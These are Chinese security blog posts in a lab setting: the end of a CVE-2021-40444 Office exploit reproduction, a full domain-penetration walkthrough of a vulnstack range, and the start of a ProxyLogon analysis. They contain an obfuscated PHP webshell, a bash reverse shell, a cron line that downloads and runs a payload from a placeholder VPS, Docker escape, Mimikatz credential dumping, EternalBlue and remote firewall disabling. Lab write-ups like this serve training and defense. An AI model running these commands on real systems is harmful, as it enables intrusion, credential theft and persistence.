class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>安装编译器和lcab的命令</p>
<p><code>sudo apt-get install gcc-mingw-w64</code></p>
<p><code>sudo apt-get install lcab</code></p>
</blockquote>
<p>将生成的dll，包装成 <code>cab</code></p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">cp calc.dll championship.<span class="keyword">inf</span> ; <span class="keyword">mkdir</span> <span class="keyword">gen</span>/ ; <span class="keyword">cd</span> <span class="keyword">gen</span>/ ; lcab &#x27;../championship.<span class="keyword">inf</span>&#x27; exploit.cab</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-13/1631375079049.png"></p>
<p>在利用 lockedbyte 大佬的脚本去处理一下 <code>cab</code> <a href="https://github.com/lockedbyte/CVE-2021-40444/blob/master/patch_cab.py">https://github.com/lockedbyte/CVE-2021-40444/blob/master/patch_cab.py</a></p>
<h4 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h4><p>将 <code>exploit.html</code> 和 <code>exploit.cab</code> 放在同目录下</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">python3</span> -m http.server <span class="number">80</span></span><br></pre></td></tr></table></figure>

<p>运行 <code>word.docx</code> 触发命令执行</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-13/1631376976037.png"></p>
<h4 id="上线CS"><a href="#上线CS" class="headerlink" title="上线CS"></a>上线CS</h4><p>利用cs生成powershell payload</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-13/1631379893000.png"></p>
<p>替换到 c 中的执行命令点，重复上面第三步操作生成 <code>cab</code></p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">i686-w64-mingw32-gcc -shared powershell.c -o <span class="keyword">help</span>.dll</span><br><span class="line"></span><br><span class="line">cp <span class="keyword">help</span>.dll championship.<span class="keyword">inf</span> ; <span class="keyword">mkdir</span> <span class="keyword">help</span>/ ; <span class="keyword">cd</span> <span class="keyword">help</span>/ ; lcab &#x27;../championship.<span class="keyword">inf</span>&#x27; <span class="keyword">help</span>.cab</span><br></pre></td></tr></table></figure>

<p>将 <code>cab</code> 和 <code>html</code> 放在同一目录</p>
<p>目标靶机打开 word，成功上线CS！</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-13/1631383770030.png"></p>
<h4 id="END"><a href="#END" class="headerlink" title="END"></a>END</h4><p>复现过程中，踩了很多坑，比如 internet设置 ActiveX 需要设置为启用，允许未签名的下载</p>
<p>生成的上线cs payload需要为x86，x64无法上线（可能是我自己环境的问题）</p>
<h4 id="References"><a href="#References" class="headerlink" title="References"></a>References</h4><p><a href="https://mp.weixin.qq.com/s/hjjLKQCiaVUKWOw1jzQE9A">https://mp.weixin.qq.com/s/hjjLKQCiaVUKWOw1jzQE9A</a></p>
<p><a href="https://mp.weixin.qq.com/s/KOsb2SksOq_qy0pG3PeYRA">https://mp.weixin.qq.com/s/KOsb2SksOq_qy0pG3PeYRA</a></p>
<p><a href="https://github.com/lockedbyte/CVE-2021-40444">https://github.com/lockedbyte/CVE-2021-40444</a></p>
]]></content>
      <categories>
        <category>上线CS</category>
      </categories>
      <tags>
        <tag>CVE</tag>
        <tag>CS</tag>
        <tag>钓鱼</tag>
        <tag>Office</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次域渗透的全过程</title>
    <url>/2021/09/06/pentest_20210903/</url>
    <content><![CDATA[<h4 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h4><p>三层网络域渗透靶场</p>
<span id="more"></span>

<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-03/20210226161713.png"></p>
<h4 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h4><p>首先拿到目标 pentest.com</p>
<p>直接访问发现站点是个博客站点</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-03/1629876159060.png"></p>
<p>进一步发现并没有可利用点</p>
<h5 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h5><p>利用工具进行端口扫描</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-03/1630374706034.png"></p>
<p>域名解析IP <code>10.20.29.87</code></p>
<p>发现还开放了81、6379端口</p>
<p>先访问81端口查看开放的是什么站点</p>
<p><a href="http://pentest.com:81/">http://pentest.com:81/</a>  Laravel v8.29.0 (PHP v7.4.14)</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-03/1629877245696.png"></p>
<p>通过版本可以得知是存在漏洞的版本</p>
<p>Laravel v8.29.0</p>
<h5 id="Laravel-RCE-GetShell"><a href="#Laravel-RCE-GetShell" class="headerlink" title="Laravel RCE GetShell"></a>Laravel RCE GetShell</h5><p>Laravel &lt;= v8.4.2 debug mode: Remote code execution (CVE-2021-3129)</p>
<p>利用 <strong>CVE-2021-3129</strong> 漏洞进行getshell</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">蚁剑马</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$ant</span>=create_function(<span class="string">&quot;&quot;</span>, base64_decode(<span class="string">&#x27;QGV2YWwoJF9QT1NUWyJhbnQiXSk7&#x27;</span>));<span class="variable">$ant</span>();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>利用写好的工具一键getshell</p>
<p>WebShell: <a href="http://pentest.com:81/havefun.php">http://pentest.com:81/havefun.php</a> pass: ant</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-03/1629956973422.png"></p>
<p>首先，判断当前环境及权限</p>
<p>从主机信息 <code>Linux 8e172820ac78 4.4.0-142-generic #168~14.04.1-Ubuntu SMP Sat Jan 19 11:26:28 UTC 2019 x86_64</code></p>
<p>可以看出一些特殊，判断是否是在容器中</p>
<ul>
<li>查看 <code>hostname</code></li>
<li>看根目录是否存在特征文件</li>
<li><code>cat /proc/self/cgroup</code></li>
</ul>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">(www-data:<span class="regexp">/var/</span>www/html) $ hostname</span><br><span class="line"><span class="number">8e172820</span>ac78</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-03/1629957148433.png"></p>
<p>从而判断该目标存在docker容器中</p>
<h5 id="Docker逃逸"><a href="#Docker逃逸" class="headerlink" title="Docker逃逸"></a>Docker逃逸</h5><blockquote>
<p>可以利用Docker runC漏洞逃逸 攻击脚本： <a href="https://github.com/Frichetten/CVE-2019-5736-PoC">https://github.com/Frichetten/CVE-2019-5736-PoC</a></p>
</blockquote>
<p>下面需要通过逃逸来获取宿主机的权限，当前用户权限较低</p>
<p>所有现在docker中尝试提权</p>
<p>通过命令来搜索具有SUID或4000权限的文件：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="builtin-name">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span></span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-03/1629957455952.png"></p>
<p>在/home/jobs目录下，存在一个权限是我们需要的文件 shell</p>
<p>尝试执行shell</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-03/1629957617264.png"></p>
<p>结合c文件来看，shell执行的应该是<code>ps</code>命令，从代码中也可以看出执行的<code>ps</code>，并没有使用绝对路径，那么就可以通过修改 <code>$PATH</code> 来劫持 <code>ps</code> 命令的路径，看下面操作：</p>
<p><strong>路径劫持</strong></p>
<p>先反弹shell到攻击机上</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">bash -<span class="keyword">c</span> <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/10.20.29.77/8443 0&gt;&amp;1&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/bin/bash&quot;</span> &gt; ps</span><br><span class="line">chmod 777 ps</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span> <span class="comment"># 将/tmp添加到环境变量中，并且先加载执行/tmp里的程序</span></span><br><span class="line"><span class="built_in">cd</span> /home/<span class="built_in">jobs</span></span><br><span class="line">./shell</span><br><span class="line"><span class="comment"># 然后就获得了root权限，可以执行命令了</span></span><br></pre></td></tr></table></figure>

<p>测试过程中反弹shell出现了问题，这里借助冰蝎的虚拟终端进行添加环境变量</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-03/1629961746221.png"></p>
<p>（后面发现是环境的自动获取的IP问题，无法ping通外网，补充）</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-03/1629964324301.png"></p>
<p>通过这种特殊情况获取到了容器中的 <code>root</code> 权限</p>
<p>但实际情况中，遇到的不多，使用下面利用普通权限反弹回msf，进一步docker逃逸</p>
<p><strong>三种形式：</strong></p>
<ol>
<li>直接反弹msf</li>
<li>反弹回msf衍生到cs中</li>
<li>直接反弹cs中</li>
</ol>
<p>这里直接利用 c2 完成linux上线cs</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-03/1630055992150.png"></p>
<p>接着<strong>利用Docker 特权模式逃逸</strong></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-03/1630285664576.png"></p>
<p>首先创建一个挂载目录 <code>/hack</code></p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /hack</span><br></pre></td></tr></table></figure>

<p>然后 <code>ls /dev</code> 看到/dev目录会发现很多设备文件</p>
<p>接着可以尝试将 <code>/dev/sda1</code> 挂载到<code>/hack</code>目录</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">mount <span class="regexp">/dev/</span>sda1 /hack</span><br></pre></td></tr></table></figure>

<p>过程中出现权限问题</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-03/1630286720020.png"></p>
<p>所以还是需要用上面提到的方式，获取到root权限，再反弹到cs上</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-03/1630287582562.png">root权限上线后，重复上述步骤进行挂载</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-03/1630287691144.png"></p>
<p>挂载后，就可以看到 <code>/hack</code> 目录中已经挂载到宿主机的根目录</p>
<p>接下来就可以通过写定时任务来获取宿主机的权限</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">echo <span class="string">&#x27;* * * * * wget -qO c2fun --no-check-certificate http://[vps]:8080/c2pen; chmod +x c2fun; ./c2fun&#x27;</span> &gt;&gt; <span class="regexp">/hack/</span>var<span class="regexp">/spool/</span>cron<span class="regexp">/crontabs/</span>root</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-03/1630295292746.png"></p>
<p>执行命令查看网卡信息</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">shell <span class="regexp">/sbin/i</span>fconfig</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-03/1630296092579.png"></p>
<h5 id="Redis未授权RCE拿下DMZ权限"><a href="#Redis未授权RCE拿下DMZ权限" class="headerlink" title="Redis未授权RCE拿下DMZ权限"></a>Redis未授权RCE拿下DMZ权限</h5><p>从网卡信息可以得到两个网段</p>
<p><code>192.168.80.20/24</code></p>
<p><code>192.168.93.10/24</code></p>
<p>并没有看到 <code>10.20.29.87</code> 这个地址，所以可能是使用了反向代理</p>
<p>在上面有收集到 <code>10.20.29.87</code> 这个ip还开放了 <code>6379</code> 端口，尝试redis未授权</p>
<p>存在未授权后直接写入公钥</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-03/1630387916776.png"></p>
<p>直接连接</p>
<p><code>ssh root@10.20.29.87</code></p>
<p>反弹回CS</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">wget -qO c2fun --no-check-certificate <span class="link">http://</span>[<span class="string">vps</span>]:8080/c2pen; chmod +x c2fun; ./c2fun</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-03/1630388918973.png"></p>
<p>通过网卡信息可以确定这台机器就是<code>DMZ</code>区的主机，并且获取到了root权限</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-03/1630389032916.png"></p>
<p>通过查看配置文件，可以确定是通过反向代理访问到第二层机器的，接下来是对第二层内网渗透</p>
<h4 id="内网横向移动"><a href="#内网横向移动" class="headerlink" title="内网横向移动"></a>内网横向移动</h4><p>因为上线是CS，内网探测不方便，可以使用socket代理，或者借助msf进行内网网段探测</p>
<p>（本来是想将cs会话传递到msf上，但目标机器为linux在未找到派生方法）</p>
<p>直接通过无文件落地的方式进行反弹到msf</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-03/1630391571790.png"></p>
<h5 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h5><p>查看两个session中对应的网段</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-03/1630391926923.png"></p>
<p><code>192.168.80.0/24</code></p>
<p><code>192.168.93.0/24</code></p>
<p>这里先对第一个网段进行探测</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">route <span class="builtin-name">add</span> 192.168.80.0 255.255.255.0 1</span><br><span class="line">route print</span><br><span class="line">use auxiliary/scanner/discovery/arp_sweep</span><br><span class="line"><span class="builtin-name">set</span> rhosts 192.168.80.0/24</span><br><span class="line"><span class="builtin-name">set</span> threads 10</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-03/1630394306300.png"></p>
<p>10、20的权限已经拿到了，再看看30</p>
<p>这里使用earthworm将内网流量代理出来，因为第第二层网络能出网，所以选择代理第二层流量</p>
<p>vps执行</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">./ew_linux_x64</span> <span class="string">-s</span> <span class="string">rcsocks</span> <span class="string">-l</span> <span class="number">1080</span> <span class="string">-e</span> <span class="number">7474</span></span><br></pre></td></tr></table></figure>

<p>目标主机（第二层的主机web2）</p>
<p>通过cs上传 <code>ew_linux_x64</code></p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">nohup ./ew_linux_x64 -s rssocks -d [vps] -e <span class="number">7474</span> <span class="meta">&amp;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-03/1630395655045.png"></p>
<p>kali设置代理</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">vim <span class="regexp">/etc/</span>proxychains.conf</span><br></pre></td></tr></table></figure>

<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">proxychains</span> nmap -sT -sV -Pn -F -O --open <span class="number">192.168.80.30</span></span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-03/1630399259006.png"></p>
<p>发现开放的<code>8080</code>端口</p>
<p>给浏览器设置代理，访问页面</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-03/1630405959623.png"></p>
<p>利用通达OA的任意用户登录+文件上传+文件包含漏洞进行RCE</p>
<h5 id="内网OA-getshell"><a href="#内网OA-getshell" class="headerlink" title="内网OA getshell"></a>内网OA getshell</h5><p><a href="https://blog.csdn.net/szgyunyun/article/details/107104288">https://blog.csdn.net/szgyunyun/article/details/107104288</a></p>
<p>直接使用脚本</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-03/1630406071945.png"></p>
<p>可以执行命令，上传蚁剑马</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-03/1630408654416.png"></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-03/1630408667192.png"></p>
<h5 id="拿下第二层权限"><a href="#拿下第二层权限" class="headerlink" title="拿下第二层权限"></a>拿下第二层权限</h5><p>因为第二层可以出网，尝试利用蚁剑反弹meterpreter到msf（某些原因无法直接反弹）</p>
<p>目标为windows系统，直接上传木马执行，反弹cs</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-03/1630550100494.png"></p>
<p>将CS session派生至MSF</p>
<p>利用MSF进行信息收集</p>
<h5 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h5><p>拿下第二层网络中的Windows 7服务器后，接下来我们对目标内网环境进行信息收集，对目标网络有一个初步的了解：</p>
<figure class="highlight pf"><table><tr><td class="code"><pre><span class="line">ipconfig /<span class="literal">all</span>   <span class="comment"># 查看本机ip，所在域</span></span><br><span class="line">systeminfo      <span class="comment"># 列出系统信息</span></span><br><span class="line"><span class="keyword">route</span> print     <span class="comment"># 打印路由信息</span></span><br><span class="line">net view        <span class="comment"># 查看局域网内其他主机名</span></span><br><span class="line">arp -a          <span class="comment"># 查看arp缓存</span></span><br><span class="line">whoami</span><br><span class="line">net start       <span class="comment"># 查看开启了哪些服务</span></span><br><span class="line">net share       <span class="comment"># 查看开启了哪些共享</span></span><br><span class="line"></span><br><span class="line">net config workstation   <span class="comment"># 查看计算机名、全名、用户名、系统版本、工作站、域、登录域</span></span><br><span class="line">net <span class="keyword">user</span>                 <span class="comment"># 查看本机用户列表</span></span><br><span class="line">net <span class="keyword">user</span> /domain         <span class="comment"># 查看域用户</span></span><br><span class="line">net localgroup administrators   <span class="comment"># 查看本地管理员组（通常会有域用户）</span></span><br><span class="line">net view /domain         <span class="comment"># 查看有几个域</span></span><br><span class="line">net <span class="keyword">user</span> 用户名 /domain   <span class="comment"># 获取指定域用户的信息</span></span><br><span class="line">net <span class="keyword">group</span> /domain        <span class="comment"># 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）</span></span><br><span class="line">net <span class="keyword">group</span> 组名 /domain    <span class="comment"># 查看域中某工作组</span></span><br><span class="line">net <span class="keyword">group</span> <span class="string">&quot;domain admins&quot;</span> /domain  <span class="comment"># 查看域管理员的名字</span></span><br><span class="line">net <span class="keyword">group</span> <span class="string">&quot;domain computers&quot;</span> /domain  <span class="comment"># 查看域中的其他主机名</span></span><br><span class="line">net <span class="keyword">group</span> <span class="string">&quot;domain controllers&quot;</span> /domain  <span class="comment"># 查看域控制器（可能有多台）</span></span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-03/1630568922562.png"></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-03/1630569022776.png"></p>
<p>综合上面的信息</p>
<p>内网域环境域名为 <code>whoamianony.org</code> 域用户主机可能为 <code>DC.whoamianony.org</code>，且域管理员用户名可能为 <code>Administrator</code></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-03/1630569198796.png"></p>
<p><code>ping DC.whoamianony.org</code> 得到域主机ip为 <code>192.168.93.30</code></p>
<h5 id="抓取域用户密码"><a href="#抓取域用户密码" class="headerlink" title="抓取域用户密码"></a>抓取域用户密码</h5><p>通过 <code>meterpreter</code> 的kiwi模块进行获取用户密码</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">load kiwi</span><br><span class="line">kiwi_cmd privilege::debug</span><br><span class="line">kiwi_cmd sekurlsa::logonPasswords</span><br></pre></td></tr></table></figure>

<blockquote>
<p>在执行的过程中可能会出现问题，如果返回的是 x86 的 <code>meterpreter</code> 而目标机器位 x64，这个时候需要将进程迁移到x64进程中</p>
</blockquote>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-03/1630571266643.png"></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-03/1630571305482.png"></p>
<p><code>getuid</code> 查看当前是否是最高权限</p>
<p><code>ps</code> 看一下进程</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-03/1630571369320.png"></p>
<p><code>migrate 504</code> 进程迁移，迁移成功就能执行 <code>kiwi</code> 模块了</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-03/1630571419788.png"></p>
<p>这是CS中的<code>kiwi</code>模块，效果相同</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-03/1630569643224.png"></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-03/1630569689291.png"></p>
<p>这下成功抓取到了域管理用户的信息如下：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">bunny</span>：Bunny<span class="number">2021</span></span><br><span class="line"><span class="attribute">Administrator</span>：Whoami<span class="number">2021</span></span><br></pre></td></tr></table></figure>



<h5 id="进攻第三层网络"><a href="#进攻第三层网络" class="headerlink" title="进攻第三层网络"></a>进攻第三层网络</h5><p>之前获取到第三层网段为 <code>192.168.93.0/24</code></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-03/1630571889653.png"></p>
<p>这里我们借助 PC1 的session进行路由代理</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">route</span> add <span class="number">192.168.93.0</span> <span class="number">255.255.255.0</span> <span class="number">14</span></span><br><span class="line"><span class="attribute">route</span> print</span><br></pre></td></tr></table></figure>

<p>尝试<code>永恒之蓝</code>进攻其他PC机</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_version</span><br><span class="line"><span class="keyword">set</span> rhosts <span class="comment">192.168.93.1-255</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">threads 10</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-03/1630573061163.png"></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line"><span class="builtin-name">set</span> rhosts 192.168.93.40</span><br><span class="line"><span class="builtin-name">set</span> payload windows/x64/meterpreter/bind_tcp</span><br><span class="line"><span class="builtin-name">set</span> rhost 192.168.93.40</span><br><span class="line"><span class="builtin-name">set</span> lport 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-03/1630573448422.png"></p>
<p>直接拿下第四台机器 <code>PC</code></p>
<p>最后剩下域控制器DC了</p>
<h4 id="进攻域控"><a href="#进攻域控" class="headerlink" title="进攻域控"></a>进攻域控</h4><p>前面已经抓到域管理员用户名密码了，直接psexec登陆</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Administrator</span>：Whoami<span class="number">2021</span></span><br></pre></td></tr></table></figure>

<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line"><span class="keyword">set</span> rhosts <span class="comment">192.168.93.30</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">SMBUser Administrator</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">SMBPass Whoami2021</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">payload windows</span>/meterpreter/<span class="comment">bind_tcp</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">rhost 192.168.93.30</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-03/1630573695499.png"></p>
<p>创建Session失败，可能是开了防火墙的原因，既然有了账号密码，可以直接</p>
<p>用 <code>net use</code> 命令进行 <code>ipc</code> 连接主机</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">net <span class="keyword">use</span> \\<span class="number">192.168</span>.<span class="number">93.30</span>\ipc<span class="variable">$ </span><span class="string">&quot;Whoami2021&quot;</span> /<span class="symbol">user:</span><span class="string">&quot;Administrator&quot;</span></span><br></pre></td></tr></table></figure>

<p> <img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-03/1630573861254.png"></p>
<p>使用sc远程在域制器（192.168.93.30）上创建服务关闭防火墙</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">sc </span>\\<span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">30</span> create unablefirewall <span class="keyword">binpath= </span><span class="string">&quot;netsh advfirewall set allprofiles state off&quot;</span></span><br><span class="line"><span class="keyword">sc </span>\\<span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">30</span> start unablefirewall</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-03/1630574005350.png"></p>
<p>再重复<code>psexec</code>操作</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-03/1630574086821.png"></p>
<p>成功拿下域控权限！</p>
<p>到此所有的目标靶机（5台）全部拿到最高权限。</p>
<h5 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h5><p>在之前的步骤有用到CS，下面用CS单独操作拿域控的流程</p>
<p>目前已经拿下的3台机子</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-03/1630574247964.png"></p>
<p>执行命令 <code>beacon&gt; net view</code> 查看域机器</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-03/1630574338694.png"></p>
<p>看到有个DC服务器</p>
<p>先转换凭据切换到域管理员凭据</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-03/1630577634693.png"></p>
<p>再从存在的目标中，找到DC域管理机，因为之前获取到域管理员hash得到密码，所以直接利用<code>psexec</code>进行登录</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-03/1630577822693.png"></p>
<p>上图中的监听器一个选择 <code>windows/beacon/bind_tcp</code>，不然无法进行横向</p>
<p>如果有防火阻断，就安装上面的操作使用<code>net use</code>来做，尝试关闭它的防火墙，然后再横向。</p>
<p>利用 PC1 这台机器去 <code>psexec</code> 拿下域控机器</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-03/1630578735830.png"></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-03/1630585398874.png"></p>
<p>利用同样的方法继续横向，通过域控主机控制域内的所以可控主机</p>
<p>至此五台主机全部拿下，加上一台docker</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-03/1630585788782.png"></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-03/1630585830714.png"></p>
<h4 id="END"><a href="#END" class="headerlink" title="END"></a>END</h4><p>正在不断学习中……<br>靶场在这：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/9/">http://vulnstack.qiyuanxuetang.net/vuln/detail/9/</a></p>
<h4 id="References"><a href="#References" class="headerlink" title="References"></a>References</h4><p><a href="https://whoamianony.top/2021/03/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/vulnstack/%E8%87%AA%E5%B7%B1%E6%90%AD%E5%BB%BA%E7%9A%84%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E5%9F%9F%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/">https://whoamianony.top/2021/03/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/vulnstack/%E8%87%AA%E5%B7%B1%E6%90%AD%E5%BB%BA%E7%9A%84%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E5%9F%9F%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/</a></p>
<p><a href="https://mp.weixin.qq.com/s/GrS6Kf7ZTDHT6cz_W1flfw">https://mp.weixin.qq.com/s/GrS6Kf7ZTDHT6cz_W1flfw</a></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>CS</tag>
        <tag>内网渗透</tag>
        <tag>MSF</tag>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>Microsoft Exchange Proxylogon Exploit Chain EXP分析</title>
    <url>/2021/03/14/analysis_20210314/</url>
    <content><![CDATA[<h2 id="CVE-2021-26855-CVE-2021-27065-复现总结"><a href="#CVE-2021-26855-CVE-2021-27065-复现总结" class="headerlink" title="CVE-2021-26855 + CVE-2021-27065  复现总结"></a>CVE-2021-26855 + CVE-2021-27065  复现总结</h2><span id="more"></span>

<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>参考  <a href="https://mp.weixin.qq.com/s/iQhgQ0JkmR6pUfDxIQph1Q">https://mp.weixin.qq.com/s/iQhgQ0JkmR6pUfDxIQph1Q</a></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-03-31/640.png"></p>
<h3 id="漏洞相关CVE编号"><a href="#漏洞相关CVE编号" class="headerlink" title="漏洞相关CVE编号"></a>漏洞相关CVE编号</h3><ul>
<li>CVE-2021–26855: Mail Exchange <strong>Pre-Auth</strong> SSRF</li>
<li>CVE-2021–26857: Post-Auth Deserialization</li>
<li>CVE-2021–26858: Post-Auth arbitrary file write</li>
<li>CVE-2021–27065: Post-Auth arbitrary file write</li>
</ul>
